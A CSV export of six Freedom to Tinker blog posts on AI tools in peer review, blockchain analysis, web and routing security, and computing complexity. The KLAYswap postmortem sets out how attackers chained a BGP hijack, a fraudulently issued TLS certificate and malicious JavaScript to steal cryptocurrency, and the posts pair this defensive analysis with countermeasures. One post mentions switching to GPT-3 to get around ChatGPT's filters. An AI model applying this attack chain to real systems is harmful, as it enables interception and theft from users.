"Count","PublishDate","VisitDate","Url","Content"
"1","2023-03-08","2023-03-24","https://freedom-to-tinker.com/2023/03/08/can-chatgpt-and-its-successors-go-from-cool-to-tool/","Anyone reading Freedom to Tinker has seen examples of ChatGPT doing cool things. One of my favorites is its amazing answer to this prompt: “write a biblical verse in the style of the King James Bible explaining how to remove a peanut butter sandwich from a VCR.” Based in part on this kind of viral example, some people are making big claims about the impact that ChatGPT will have on the world in general, and science in particular. A recent article in Nature, for example, claimed that “conversational AI is a game-changer for science.” Maybe. But, let’s not forget that there is a huge gap between writing funny instructions for removing food from home electronics and doing scientific research. In other words, there’s a big difference between being cool and being a tool. In this post, I’ll describe what happened when I tried to use ChatGPT in scientific research, specifically helpling me do peer review for a scientific paper. In short, ChatGPT didn’t help me do peer review at all; not one little bit. Although this result was somewhat disappointing for me, I think the experience offers lessons about how we can assess future versions of ChatGPT and all the new AI tools that are coming. OpenAI launched ChatGPT on November 30, 2022. People immediately rushed to demonstrate its surprising capabilities, and it seems the more surprising the demonstration, the more viral it went. Like others, I was amazed when I first saw viral screenshots of ChatGPT in action. After playing with ChatGPT for a while, I wondered whether I should stop all my work in order to focus on understanding and using ChatGPT—and all of its successors that are supposedly even bigger, better, and just around the corner. As my kids, wife, and friends can tell you, it was one of the only things I wanted to talk about for a while. Playing with ChatGPT In the course of messing around with ChatGPT, however, I started to notice a pattern. My conversations with it generally fell into two broad categories. The first could be called, “I wonder if” conversations. For example, I wonder if ChatGPT can write a wedding toast in the style of Donald Trump (answer: yes, quite well actually). These conversations were quite exciting. The second type of conversation, however, started with a real problem that I had in my work. These could be called “getting stuff done” conversations. For these kinds of conversations, ChatGPT was much less exciting. For computer programming tasks, for example, asking ChatGPT was about as helpful as searching the website Stack Overflow. To be clear, this is incredibly impressive because Stack Overflow is amazing. But, it is not that useful because Stack Overflow already exists. In order to be a useful tool, ChatGPT has to be able to help us do real things better than our existing tools. ChatGPT and scientific peer review Around the time I was playing with ChatGPT, I received a request from a scientific journal to peer review a manuscript. For non-academic readers, a bit of quick background might be helpful. When a team of researchers wants to publish a scientific paper, they send it to a journal and then the journal organizes a peer review. During peer review, the scientific journal sends the manuscript to about three other researchers. These researchers help the editor of the journal assess quality and help the authors improve. Although peer review sounds good in theory, many academics know that the process can be a slog in practice. Writing good reviews consumes a lot of time, and receiving reviews can be infuriating when it sometimes seems as if the reviewers have not even read your paper. The challenges with peer review have led to complaints and some exploration with alternatives, including using other forms of natural language processing. I personally think peer review serves an important purpose and can often work well; most of my papers are improved by peer review, even if the process can be frustrating at times. Therefore, I tried to see if I could find a way to use ChatGPT as a tool to improve peer review. Could ChatGPT write my review for me? A first draft? Could it make my review even a bit better or a bit faster? Using ChatGPT for scientific peer review Before starting this exploration, I began by thinking about the ethics of using ChatGPT for peer review. I decided that it is reasonable under certain conditions, and I’ve written more about that in the ethics appendix at the end of this post. Next I had to decide how I would measure success. By this point, I had used ChatGPT enough that I knew that it could not write a real review for me. So, I set a much simpler criterion: Could it help me at all? To assess this, I wrote a review following my normal process. Then I started interacting with ChatGPT to see if it would say something—anything—that would lead me to change my review. ChatGPT is known to have a problem with hallucination, so I knew not to take anything it said too seriously, but I was at least hopeful that it would say something that would prime my imagination and lead me to write a better, more helpful review. Immediately I ran into a mundane but very real problem. The manuscript that I received from the journal was in a complicated pdf format, and I had to convert it to plain text in order to put it into ChatGPT. Surprisingly, it took me about an hour to get it into a plain text file that I thought was fair to ChatGPT. I found this part especially frustrating because I often spend a lot of time on the reverse of this process: getting plain text into a format suitable for a journal. After I finally had the manuscript in a plain text format, I ran into a new problem: ChatGPT has a character limit. To circumvent this hurdle, I tried putting chunks of the paper into ChatGPT and asking it to review the paper. I tried many different prompts, including asking some of the questions the scientific journal asked me. Generally, these prompts fell into two buckets: aesthetic (e.g., what are the most exciting parts of this paper?) and technical (e.g., what are some concerns about the manuscript’s statistical analysis?). For both kinds of prompts, ChatGPT didn’t produce anything useful to me. Instead, it often avoided aesthetic questions by providing summaries of the paper (which wasn’t very useful because I had already read the paper carefully). For technical questions, ChatGPT avoided my question by defaulting to more general questions about common problems with statistical analysis. These general answers were not bad, they were just not helpful for improving my review. After about 20 minutes of trying and failing to get something interesting, I gave up and submitted my review with no changes. After almost 90 minutes of extra work, my review was not improved one bit. One more try This might seem like the end of this story, but it is not. For some reason, I still believed that AI might help, and I was lucky enough to run into a prompt engineer named Mike Taylor. Mike helps people write effective queries for ChatGPT and similar systems. He suggested that I try GPT-3 (to get around some of ChatGPTs filters) and try providing more context in my prompt. Based on Mike’s advice, I created an account on GPT-3 and I tried again (using the model “text-davinci-003”). These results were a bit better, because GPT-3 was more willing to express an opinion. But there was still nothing useful for my peer review. Lessons learned Overall, this experience taught me three things. First, it increased my belief that ChatGPT is cool—it did some stuff that really surprised me during this process. Second, it convinced me that ChatGPT (and GPT-3) are not obviously helpful for scientific peer review. In other words, ChatGPT is not yet a good tool, at least for this task. Finally, the experience revealed an important asymmetry: coolness is easy to assess but toolness is difficult to assess. If I had started by asking ChatGPT to review the paper, I would have gotten words that superficially seemed like a review, and I would have been very impressed. But, after doing a real review, it was easy for me to spot the limitations of ChatGPT’s responses. My colleague Matt Weinberg also reported a similar feeling about the difficulty of separating ChatGPT fancy fluff from real insight. There are some limitations to the conclusions that we should draw from my experience. First, peer review is just one part of the scientific process, and it might even be a part that is especially hard for AI. Even if we stick to the task of peer review, it is possible that someone who is both a scientific expert in the topic of this paper and expert in prompt engineering could have gotten better results. It is also possible that someone could get better results with a different kind of scientific paper. Finally, and most importantly, ChatGPT and other large language models are improving, and it could be the case that they will work better in the future—or with a fine tuned model trained specifically for peer review. Looking beyond this activity and its limitations, I hope this example suggests an interesting new way to test large language models. Peer review is an especially attractive testing ground for these models for three reasons. First, peer review is a real task and improvements would have societal benefit; this is in contrast to some other large language model evaluation tasks that seem quite artificial. Second, peer review already involves experts making careful evaluations of texts, so adding large language models into the mix seems to enable us to measure performance against world-class experts at very little additional cost. Finally, peer review is a decentralized activity, so there is room for experimentation within strong ethics norms, and the assessments of the utility can be made by authors, reviewers, and journal editors (rather than AI companies or deep skeptics). It is undeniable that ChatGPT is cool, at least to me. But will ChatGPT and other generative AI technologies really “redefine human knowledge, accelerate changes in the fabric of our reality, and reorganize politics and society” as Henry Kissinger, Eric Schmidt, and Dan Huttenlocher claimed in the Wall Street Journal? If these systems are going to live up to those kinds of claims, they are probably going to have to become really useful for many important tasks. For scientific peer review, at least, I don’t think we are there yet. We could, however, design processes that would allow us to measure progress, which is important if we want independent assessments of ChatGPT and future generative AI systems. Finally, this activity is a reminder that there is a big difference between being a powerful tool and a cool toy. Ethical appendix Before undertaking this activity, I considered the ethics of it, which is something I recommend to others in my book, Bit by Bit. I decided that this would be reasonable to try under two conditions. First, I wanted to ensure that whatever I did would meet my obligation to the authors, journal, and scientific community, at least as well as if I had done a normal peer review. In other words, I wanted to match or exceed the standard of care. Writing the review first and only then interacting with ChatGPT seems to ensure this standard. Second, I wanted to ensure transparency, so I explained in my review what I had done. Writing this blog post also helps ensure transparency-based accountability. In fact, in the process of getting feedback on this post, I learned about an issue that I had not considered: whether the prompts I put into ChatGPT—which included parts of the paper—would become part of its future training data. As of the time of this writing, it seems like the policies are rapidly changing, and the norms are unclear. Future reviewers and journals could consider this issue during future explorations with ChatGPT and other large language models. Peer review is an incredibly important process, and I hope that we can continue to explore ways to make it more useful for researchers, journals, and the scientific community. I’d like to thank Robin Berjon, Denny Boyle, Sayash Kapoor, Karen Levy, Jakob Mökander, Arvind Narayanan, Karen Rouse, Mike Taylor, and Jevin West for helpful conversations. All views expressed are, of course, my own."
"2","2021-03-15","2023-03-24","https://freedom-to-tinker.com/2021/03/15/ai-nation-podcast-from-citp-and-whyy/","I’m excited to introduce AI Nation: a podcast about AI, everyday life, and what happens when we delegate vital decisions to machines. It’s a collaboration, born at CITP, between Princeton University and WHYY, Philadelphia’s famous NPR station. The first episode drops on April 1. Tune in, and you’ll hear a variety of voices. You’ll hear my co-host, Malcolm Burnley, a journalist who reports on culture and social justice, a non-scientist sci-fi enthusiast who is much hipper than me. (A low bar, I know, but you get my point.) You’ll hear voices of people who have been impacted by AI problems, such as being arrested due to bad facial recognition. And you’ll hear from a diverse group of experts on the tech and its implications. We spent a long time figuring out how to make a podcast that is compelling without being superficial, and connects everyday life to the deep and important issues raised by the AI and computing revolution. There were several false starts and some pilots that got progressively closer to the vision. Then we connected to the team at WHYY, and found the recipe. I hope you like it. Whatever you think, let us know! Huge thanks to everyone who has made this possible. At Princeton, that starts with Olga Russakovsky who helped to hatch the original vision, Tithi Chattopadhyay who shepherded the process from beginning to end, Margaret Koval who advised us and made vital connections, and Daniel Kearns for his peerless audio engineering. At WHYY, the thanks start with our producer Alex Stern (now I know and more importantly appreciate everything a producer does!), John Sheehan, and of course my co-host Malcolm Burnley."
"3","2017-09-11","2023-03-24","https://freedom-to-tinker.com/2017/09/11/blocksci-a-platform-for-blockchain-science-and-exploration/","The Bitcoin blockchain — currently 140GB and growing — contains a massive amount of data that can give us insights into the Bitcoin ecosystem, including how users, businesses, and miners operate. Today we’re announcing BlockSci, an open-source software tool that enables fast and expressive analysis of Bitcoin’s and many other blockchains, and an accompanying working paper that explains its design and applications. Our Jupyter notebook demonstrates some of BlockSci’s capabilities. Current tools for blockchain analysis depend on general-purpose databases that have full support for transactions. But that’s unnecessary for blockchain analysis where the data structures are append-only. We take advantage of this observation in the design of our custom in-memory blockchain database as well as an analysis library. BlockSci’s core infrastructure is written in C++ and optimized for speed. (For example, traversing every transaction input and output on the Bitcoin blockchain takes only 10.3 seconds on our r4.2xlarge EC2 machine.) To make analysis more convenient, we provide Python bindings and a Jupyter notebook interface. This interface is slower, but is ideal for exploratory analyses and allows users to quickly iterate when developing new queries. The code below shows the convenience of traversing the blockchain using straightforward Python idioms, built-in currency conversion using historical exchange-rate data, and the use of pandas DataFrames for analysis and visualization.. fees = [sum(block.fees) for block in chain.range('2017')]
times = [block.time for block in chain.range('2017')]
converter = blocksci.CurrencyConverter()
df = pandas.DataFrame({""Fee"":fees}, index=times)
df = converter.satoshi_to_currency_df(df, chain) When plotted, it results in the following graph showing the average transaction fee per block: BlockSci uses a custom data format; it comes with a parser that generates this data from the serialized blockchain format recorded by cryptocurrency nodes such as bitcoind. The parser supports incremental updates when new blocks are received, and making it easy to stay up to date with the latest version of the blockchain. We’ve used BlockSci to analyze Bitcoin, Bitcoin Cash, Litecoin, Namecoin, Dash, and ZCash; many other cryptocurrencies make no changes to the blockchain format, and so should be supported with no changes to BlockSci. In our working paper, we present four analyses that show BlockSci’s usefulness for answering research questions. We show how multisignatures unfortunately weaken privacy and confidentiality; we apply the cluster intersection attack to Dash, a privacy-focused altcoin; we analyze inefficiencies in the usage of block space; and we present improved methods for estimating of how often coins change possession as opposed to just being shuffled around. Here’s an illustrative example. Exploratory graph analysis using BlockSci allowed us to discover a behavioral pattern in the usage of multisignatures that weakens security. Multisignatures are a security-enhancing mechanism that distribute control of an address over a number of different public keys. Surprisingly, we found that users often negate this security by moving their funds from a multisig address to a regular address and then back again after a period of a few hours to days. We think this happens when users are changing the access control policy on their wallet, although it is unclear why they transfer their funds to a regular address in the interim, and not directly to the new multisig address. This pattern of behavior has led over $12 million dollars to be left insecure over the course of over 22,000 transactions. What users may not appreciate is that the temporary weakening of security is advertised to potential attackers on the blockchain. There’s far more to explore on public blockchains. BlockSci is publicly available now, and we hope you’ll find it useful. It is easy to get started using the EC2 image we’ve released, which includes the Bitcoin blockchain data in addition to the tool. BlockSci is open-source, and we welcome contributions. This is an alpha release; we’re continuing to improve it and the interface may change a bit in future releases. We look forward to working with the community and to hearing about other creative uses of the data and the tool."
"4","2022-09-20","2023-03-24","https://freedom-to-tinker.com/2022/09/20/cross-layer-security-a-holistic-view-of-internet-security/","By Henry Birge-Lee, Liang Wang, Grace Cimaszewski, Jennifer Rexford and Prateek Mittal On February 3, 2022, attackers launched a highly effective attack against the Korean cryptocurrency exchange KLAYswap. We discussed the details of this attack in our earlier blog post “Attackers exploit fundamental flaw in the web’s security to steal $2 million in cryptocurrency.” However, in that post we only scratched the surface of potential countermeasures that could prevent such attacks. In this new post, we will discuss how we can defend the web ecosystem against attacks like these. This attack was composed of multiple exploits at different layers of the network stack. We term attacks like this, “cross-layer attacks,” and offer our perspective on why they are so effective. Furthermore, we propose a practical defense strategy against them that we call “cross-layer security.” As we discuss below, cross-layer security involves security technologies at different layers of the network stack working in harmony to defend vulnerabilities that are difficult to catch at a single layer alone. At a high level, the adversary’s attack affected many layers of the networking stack: The network layer is responsible for providing reachability between hosts on the Internet. The first part of the adversary’s attack involved targeting the network layer with a Border Gateway Protocol (BGP) attack that manipulated routes to hijack traffic intended for the victim. The session layer is responsible for secure end-to-end communication over the network. To attack the session layer, the adversary leveraged its attack on the network layer to obtain a digital certificate for the victim’s domain from a trusted Certificate Authority (CA). With this digital certificate the adversary established encrypted and secure TLS sessions with KLAYswap users. The application layer is responsible for interpreting and processing data that is sent over the network. The adversary used the hijacked TLS sessions with KLAYswap customers to serve malicious Javascript code that compromised the KLAYswap web application and caused users to unknowingly transfer their funds to the adversary. The difficulty of fully protecting against cross-layer vulnerabilities like these is that they exploit the interactions between the different layers involved: a vulnerability in the routing system can be used to exploit a weak link in the PKI, and even the web-development ecosystem is involved in this attack because of the way javascript is loaded. The cross-layer nature of these vulnerabilities often leads developers working in each layer to dismiss the vulnerability as a problem with other layers. There have been several attempts to secure the web against these kinds of attacks at the HTTP layer. Interestingly, these technologies often ended up dead-in-the-water (as was the case with HTTP pinning and Extended Validation certificates). This is because the HTTP layer alone does not have the routing information needed to properly detect these attacks and can only rely on information that is available to end-user applications. This potentially causes HTTP-only defenses to block connections when benign events take place, like when a domain chooses to move to a new hosting provider or changes its certificate configuration because these look very similar to routing attacks at the HTTP layer. Due to the cross-layer nature of these vulnerabilities, we need a different mindset to fix the problem: people at all layers need to fully deploy any security solutions that are realistic at that layer. As we will explain below, there is no silver bullet that can be quickly deployed at any layer; instead, our best hope is more modest (but easier to deploy) security improvements for all the layers involved. Working under a “the other layer will fix the problem” attitude simply perpetuates these vulnerabilities. Below are some short-term and ideal long-term expectations for each layer of the stack involved in these attacks. While in theory, any layer implementing one of these “long-term” security improvements could drastically reduce the attack surface, these technologies have still not seen the type of deployment needed for us to rely on them in the short term. On the other hand, all the technologies in the short-term list have seen some degree of production-level/real-world deployment and are something members of these communities can start using today without much difficulty. Short-Term Changes Long-Term Goals Web apps (application layer) Reduce the use of code loaded from external domains Sign and authenticate all code being executed The PKI/TLS (session layer) Universally deploy multiple vantage point validation Adopt a technology to verify identity based on cryptographically-protected DNSSEC which provides security in the presence of powerful network attacks Routing (network layer) Sign and verify routes with RPKI and follow the security practices outlined by MANRS Deploy BGPSec for near-complete elimination of routing attacks To elaborate: At the application layer: Web apps are downloaded over the Internet and are completely decentralized. For the time being, there is no mechanism in place to universally vouch for the authenticity of code or content that is contained in a web app. If an adversary can obtain a TLS certificate for google.com and intercept your connection to Google, your browser (right now) will have no way of knowing that it is being served content that did not actually come from Google’s servers. However, developers can remember that any third-party-dependency (particularly those loaded from different domains) can be a third-party-vulnerability and limit the use of third-party code on their website (or host third-party code locally to reduce the attack surface). Furthermore, both locally hosted and third-party hosted content can be secured with subresource integrity where a cryptographic hash (included on the webpage) vouches for the integrity of dependencies. This lets developers provide cryptographic signatures for the dependencies on their webpage. Doing this vastly reduces the attack surface forcing the attacks to target only a single connection with the victim’s web server as opposed to the many different connections involved in retrieving different dependencies. At the session layer: CAs need to establish the identity of customers requesting certificates and, while there are proposals to use cryptographic DNSSEC to verify identity (like DANE), the status quo is to verify identity via network communications with the domains listed in certificate requests. Thus, global routing attacks are likely to be very effective against CAs unless we make more substantial changes to the way certificates are issued. But this does not mean all hope is lost. Many network attacks are not global but are actually localized to a specific part of the Internet. CAs are capable of mitigating these attacks by verifying domains from several vantage points spread throughout the Internet. This allows some of the CAs vantage points to be unaffected by the attack and communicate with the legitimate domain owner. Our group at Princeton designed multiple vantage point validation and worked with the world’s largest web PKI CA Let’s Encrypt to develop the first ever production deployment of it. CAs can and should use multiple vantage points to verify domains making them immune to localized network attacks and ensuring that they see a global perspective on routing. At the network layer: In routing, protecting against all BGP attacks is difficult. It requires expensive public-key operations on every BGP update using a protocol called BGPsec that current routers do not support. However, recently there has been significantly increased adoption of a technology called the Resource Public Key Infrastructure (RPKI) that prevents global attacks by establishing a cryptographic database of which networks on the Internet control which IP address blocks. Importantly, when properly configured, RPKI also specifies what size IP prefix should be announced which prevents global and highly-effective sub-prefix attacks. In a sub-prefix attack the adversary announces a longer, more-specific IP prefix than the victim and benefits from longest-prefix-match routing to have its announcement preferred by the vast majority of the Internet. RPKI is fully compatible with current router hardware. The only downside is that RPKI can still be evaded with certain local BGP attacks where, instead of claiming to own the victim’s IP address which is checked against the database, an adversary simply claims to be an Internet provider of the victim. The full map of which networks are connected to which other networks is not currently secured by the RPKI. This leaves a window for some types of BGP attacks which we have seen in the wild. However the impact of these attacks is significantly reduced and often affects only a part of the Internet. In addition, the MANRS project provides recommendations for best operational practices including RPKI that help prevent and mitigate BGP hijacks. Using Cross-Layer Security to Defend Cross-Layer Attacks Looking across these layers we see a common trend: in every layer there are proposed security technologies that could potentially stop attacks like the KLAYswap attack. However, these technologies all face deployment challenges. In addition, there are more modest technologies that are seeing extensive real-world deployment today. But each of these deployed technologies alone can be evaded by an adaptive adversary. For example, RPKI can be evaded by local attacks, multiple-vantage-point validation can be evaded by global attacks, etc. However, if we instead look at the benefit offered by all of these technologies together deployed at different layers, things look more promising. Below is a table summarizing this: Security Technology/Layer Good at detecting routing attacks which affect the entire Internet Good at detecting routing attacks which affect part of the Internet Limits the number of potential targets for routing attacks RPKI at the Network Layer Yes No No Multiple-Vantage-Point Validation at the Session Layer No Yes No Subresource Integrity and Locally Hosted Content at the Application Layer No No Yes This synergy of security technologies deployed at different layers is what we call cross-layer-security. RPKI alone can be evaded by clever adversaries (using attack techniques we are seeing more and more in the wild). However, the attacks that evade RPKI tend to be local (i.e., not affecting the entire Internet). This synergizes with multiple-vantage-point validation that is best at catching local attacks. Furthermore, because even these two technologies working together do not fully eliminate the attack surface, improvements at the web layer that reduce the reliance on code loaded from external domains help to even further reduce the attack surface. At the end of the day, the entire web ecosystem can benefit tremendously from each layer deploying security technologies that leverage the information and tools available exclusively to that layer. Furthermore, when working in unison, these technologies together can do something that none of them could do alone: stop cross-layer attacks. Cross-layer attacks are surprisingly effective because no one layer has enough information about the attack to completely prevent it. Hopefully, each layer does have the ability to protect against a different portion of the attack surface. If developers across these different communitie know what type of security is realistic and expected of their layer in the stack, we will see some meaningful improvements. Even though the ideal endgame is to deploy a security technology that is capable of fully defending against cross-layer attacks, we have not yet seen wide scale adoption of any such technology. In the meantime if we continue to solely focus security against cross-layer attacks in a single layer, these attacks will take significantly longer to protect against. Changing our mindset and seeing the strengths and weaknesses of each layer lets us protect against these attacks much more quickly by increasing the use of synergistic technologies at different layers that have already seen real-world deployment."
"5","2022-03-09","2023-03-24","https://freedom-to-tinker.com/2022/03/09/attackers-exploit-fundamental-flaw-in-the-webs-security-to-steal-2-million-in-cryptocurrency/","By Henry Birge-Lee, Liang Wang, Grace Cimaszewski, Jennifer Rexford and Prateek Mittal On Thursday, Feb. 3, 2022, attackers stole approximately $2 million worth of cryptocurrency from users of the Korean crypto exchange KLAYswap. This theft, which was detailed in a Korean-language blog post by the security firm S2W, exploited systemic vulnerabilities in the Internet’s routing ecosystem and in the Public Key Infrastructure (PKI), leaving the Internet’s most sensitive financial, medical and other websites vulnerable to attack. Remarkably, years earlier, researchers at Princeton University predicted such attacks in the wild and successfully developed initial countermeasures against it, which we will describe here. But unless these flaws are addressed holistically, a vast number of applications can be compromised by the exact same type of attack. Unlike many attacks that are caused by zero-day vulnerabilities (which are often patched rapidly) or a blatant disregard for security precautions, the KLAYswap attack was not related to any software or security configuration used by KLAYswap. Rather, it was a well-crafted example of a cross-layer attack exploiting weaknesses across the routing system, public key infrastructure, and web development practices. We’ll discuss defenses more in a subsequent blog post, but protecting against this attack demands security improvements across all layers of the web ecosystem. The vulnerabilities exploited in this attack have not been mitigated. They are just as viable today as they were when this attack was launched. That is because the hack exploited structural vulnerabilities in the trust the PKI places in the Internet’s routing infrastructure. Postmortem The February 3 attack happened precisely at 1:04:18 a.m. GMT (10:04 a.m. Korean Time), when KLAYswap was compromised using a fundamental vulnerability in the trust placed in various layers of the web’s architecture. KLAYswap is an online cryptocurrency exchange that offers users a web interface for trading cryptocurrency. As part of their platform, KLAYswap relied on a javascript library written by Korean tech company Kakao Corp. When users were on the cryptocurrency exchange, their browsers would load Kakao’s javascript library directly from Kakao’s servers at the following URL (see diagram): https://developers[.]kakao.com/sdk/js/kakao.min.js It was actually this URL that was the attacker’s target, not any of the resources operated by KLAYswap itself. Attackers exploited a technique known as a Border Gateway Protocol (BGP) hijack to launch this attack. A BGP hijack happens when a malicious network essentially lies to neighboring networks about what Internet addresses (or IP addresses) it can reach. If the neighboring networks believe this lie, they will route the victim’s traffic to the malicious network for delivery instead of the networks connecting to the legitimate owner of those IP addresses, allowing it to be hijacked. Specifically, the domain name in the URL above: developers.kakao.com resolves to two IP addresses: 121.53.104.157 and 211.249.221.246. Packets going to these IP addresses are supposed to be routed to Kakao. During the attack, the adversary’s malicious network announced two IP prefixes (i.e., blocks of IP addresses that are used when routing traffic) that caused traffic to these addresses to be routed to the adversary. When KLAYswap customers requested kakao.min.js from the adversary, the adversary served them a malicious javascript file that caused users’ cryptocurrency transactions to transfer funds to the adversary instead of the intended destination. After running the attack for several hours, the adversary withdrew its route and cashed out by converting its coins to untraceable currencies. By the time the dust settled, the adversary had stolen approximately $2 million worth of various currencies from users of KLAYswap and walked away with approximately $1 million dollars worth of various cryptocurrencies. (Some losses were due to fees and exchange rates associated with exfiltrating the currencies from the KLAYswap ecosystem.) But what about cryptography? The second and most dangerous element of the attack was its neutralization of the Internet’s encryption defenses. While there is a moderate level of complexity associated with BGP hijacks, they do happen relatively often (some of the most egregious examples involve China Telecom routing about 15 percent of Internet traffic through its network for 18 minutes and Pakistan Telecom accidently taking down Youtube in a botched attempt at local censorship). What is unprecedented in this attack (to our knowledge) is the complete bypassing of the cryptographic protections offered by the TLS protocol. TLS is the workhorse of encryption of the World Wide Web and is part of the reason the web is trusted with more and more secure applications like financial services and medical systems. Among other security properties, TLS is designed to protect the confidentiality and integrity of user data. TLS allows a web service and a client (like a user of KLAYswap) to securely exchange data even over a potentially untrusted network (like the adversary’s network in the event of this attack) and also ensure (in theory) they are talking to the legitimate endpoint. Yet, ironically, KLAYswap and Kakao were properly using TLS, and it was not a vulnerability in the TLS protocol that was exploited during the attack. Instead, the attack exploited the false trust that TLS places in the routing infrastructure. TLS relies on the Public Key Infrastructure (PKI) to confirm the identity of the web servers. The PKI is tasked with distributing digitally signed certificates that verify the server’s identity (in this case the domain name like developers.kakao.com) and the server’s cryptographic key. If a server presents a valid certificate, even if there is another network in the middle, a client can encrypt data that only the real server can read. Using its BGP hijack, the adversary first targeted the PKI and launched a man-in-the-middle attack on the certificate distribution process. Only after it had acquired a valid digital certificate for the target domain did it aim its attack towards real users by serving its malicious javascript file over an encrypted connection. Certificate Authorities (or CAs, the entities that sign digital certificates in the PKI) have a similar identity problem to the one in TLS connections. CAs are approached by customers with requests to sign certificates. The CA needs to make sure the customer requesting a certificate actually controls the associated domain name. To verify identity (and thus bootstrap trust for the entire TLS ecosystem), CAs perform domain control validation requiring users to prove control of the domain listed in their certificate requests. Since the server might be getting a TLS certificate for the first time, domain control validation is often performed over no-security-attached HTTP. But now we are back to square one: the adversary simply needs to perform a BGP hijack to attract the domain control validation traffic from the CA, pretend to be the victim website, and serve the content the CA requested. After receiving a signed certificate for the victim’s domain, the adversary can serve real users over the supposedly “secure” TLS connection. This is indeed what happened in the KLAYswap attack and makes the attack particularly scary for other secure applications across the Internet. The attackers hijacked developers.kakao.com, approached the certificate authority ZeroSSL, requested a certificate for developers.kakao.com, and served this certificate to KLAYswap users that were downloading the javascript library over presumably “secure” TLS. While Princeton researchers anticipated this attack and effectively deployed the first countermeasures against it, fully securing the web from it is still an ongoing effort. Ever since our live demo of this type of attack at HotPETS’17 and our USENIX Security ‘18 paper “Bamboozling Certificate Authorities with BGP” that developed a taxonomy of BGP attacks on the PKI, we have actively been working on developing defenses against it. The defense that has had the biggest impact (that our group developed in our 2018 USENIX Security paper) is known as multiple vantage point domain control verification. In multiple vantage point verification, a CA performs domain control validation from many vantage points spread throughout the Internet instead of a single vantage point that can easily be affected by a BGP attack. As we measured in our 2021 USENIX Security paper, this is effective because many BGP attacks are localized to only a part of the Internet, so it becomes significantly less likely that an adversary will hijack all of a CAs diverse vantage points (compared to traditional domain control validation). We have worked with Let’s Encrypt, the world’s largest web PKI CA, to fully deploy multiple vantage point validation, and every certificate they sign is validated using this technology (over a billion since the deployment in Feb 2020). Cloudflare also has developed a deployment as well, which is available for other interested CAs. But multiple vantage point validation at just a single CA is still not enough. The Internet is only as strong as its weakest link. Currently, Let’s Encrypt is the only certificate authority using multiple vantage point validation and an adversary can, for many domains, pick which CA to use in an attack. To prevent this, we advocate for universal adoption through the CA/Browser Forum (the governing body for CAs). Additionally, some BGP attacks can still fool all of a CA’s vantage points. To reduce the impact of BGP attacks, we need security improvements in the routing infrastructure as well. In the short term, deployed routing technologies like the Resource Public Key Infrastructure (RPKI) could significantly limit the spread of BGP attacks and make them much less likely to be successful. Today only about 35 percent of the global routing table is covered by RPKI, but this is rapidly growing as more networks adopt this new technology. In the long run, we need a much more secure underlying routing layer for the Internet. Examples of this are BGPsec, where routers cryptographically sign and verify BGP update messages (although current router hardware cannot perform the cryptographic operations quickly enough) and clean-slate initiatives like SCION that change the format of IP packets to offer significantly more secure packet forwarding and routing decisions. Overall, seeing an adversary execute this attack in the real world puts immense importance on securing the PKI from routing attacks. Moving forward with RPKI and multiple vantage point domain validation is a must if we want to continue trusting the web with secure applications. In the meantime, thousands of secure applications that trust TLS to protect against network attacks are vulnerable the same way KLAYswap was."
"6","2022-08-03","2023-03-24","https://freedom-to-tinker.com/2022/08/03/the-anomaly-of-cheap-complexity/","Why are our computer systems so complex and so insecure? For years I’ve been trying to explain my understanding of this question. Here’s one explanation–which happens to be in the context of voting computers, but it’s a general phenomenon about all our computers: There are many layers between the application software that implements an electoral function and the transistors inside the computers that ultimately carry out computations. These layers include the election application itself (e.g., for voter registration or vote tabulation); the user interface; the application runtime system; the operating system (e.g., Linux or Windows); the system bootloader (e.g., BIOS or UEFI); the microprocessor firmware (e.g., Intel Management Engine); disk drive firmware; system-on-chip firmware; and the microprocessor’s microcode. For this reason, it is difficult to know for certain whether a system has been compromised by malware. One might inspect the application-layer software and confirm that it is present on the system’s hard drive, but any one of the layers listed above, if hacked, may substitute a fraudulent application layer (e.g., vote-counting software) at the time that the application is supposed to run. As a result, there is no technical mechanism that can ensure that every layer in the system is unaltered and thus no technical mechanism that can ensure that a computer application will produce accurate results. [Securing the Vote, page 89-90] So, computers are insecure because they have so many complex layers. But that doesn’t explain why there are so many layers, and why those layers are so complex–even for what “should be a simple thing” like counting up votes. Recently I came across a really good explanation: a keynote talk by Thomas Dullien entitled “Security, Moore’s law, and the anomaly of cheap complexity” at CyCon 2018, the 10th International Conference on Cyber Conflict, organized by NATO. Thomas Dullien’s talk video is here, but if you want to just read the slides, they are here. As Dullien explains, A modern 2018-vintage CPU contains a thousand times more transistors than a 1989-vintage microprocessor. Peripherals (GPUs, NICs, etc.) are objectively getting more complicated at a superlinear rate. In his experience as a cybersecurity expert, the only thing that ever yielded real security gains was controlling complexity. His talk examines the relationship between complexity and failure of security, and discusses the underlying forces that drive both. Transistors-per-chip is still increasing every year; there are 3 new CPUs per human per year. Device manufacturers are now developing their software even before the new hardware is released. Insecurity in computing is growing faster than security is improving. The anomaly of cheap complexity. For most of human history, a more complex device was more expensive to build than a simpler device. This is not the case in modern computing. It is often more cost-effective to take a very complicated device, and make it simulate simplicity, than to make a simpler device. This is because of economies of scale: complex general-purpose CPUs are cheap. On the other hand, custom-designed, simpler, application-specific devices, which could in principle be much more secure, are very expensive. This is driven by two fundamental principles in computing: Universal computation, meaning that any computer can simulate any other; and Moore’s law, predicting that each year the number of transistors on a chip will grow exponentially. ARM Cortex-M0 CPUs cost pennies, though they are more powerful than some supercomputers of the 20th century. The same is true in the software layers. A (huge and complex) general-purpose operating system is free, but a simpler, custom-designed, perhaps more secure OS would be very expensive to build. Or as Dullien asks, “How did this research code someone wrote in two weeks 20 years ago end up in a billion devices?” Then he discusses hardware supply-chain issues: “Do I have to trust my CPU vendor?” He discusses remote-management infrastructures (such as the “Intel Management Engine” referred to above): “In the real world, ‘possession’ usually implies ‘control’. In IT, ‘possession’ and ‘control’ are decoupled. Can I establish with certainty who is in control of a given device?” He says, “Single bitflips can make a machine spin out of control, and the attacker can carefully control the escalating error to his advantage.” (Indeed, I’ve studied that issue myself!) Dullien quotes the science-fiction author Robert A. Heinlein: “How does one design an electric motor? Would you attach a bathtub to it, simply because one was available? Would a bouquet of flowers help? A heap of rocks? No, you would use just those elements necessary to its purpose and make it no larger than needed — and you would incorporate safety factors. Function controls design.” Heinlein, The Moon Is A Harsh Mistress and adds, “Software makes adding bathtubs, bouquets of flowers, and rocks, almost free. So that’s what we get.” Dullien concludes his talk by saying, “When I showed the first [draft of this talk] to some coworkers they said, ‘you really need to end on a more optimistic note.” So Dullien gives optimism a try, discussing possible advances in cybersecurity research; but still he gives us only a 10% chance that society can get this right. Postscript: Voting machines are computers of this kind. Does their inherent insecurity mean that we cannot use them for counting votes? No. The consensus of election-security experts, as presented in the National Academies study, is: we should 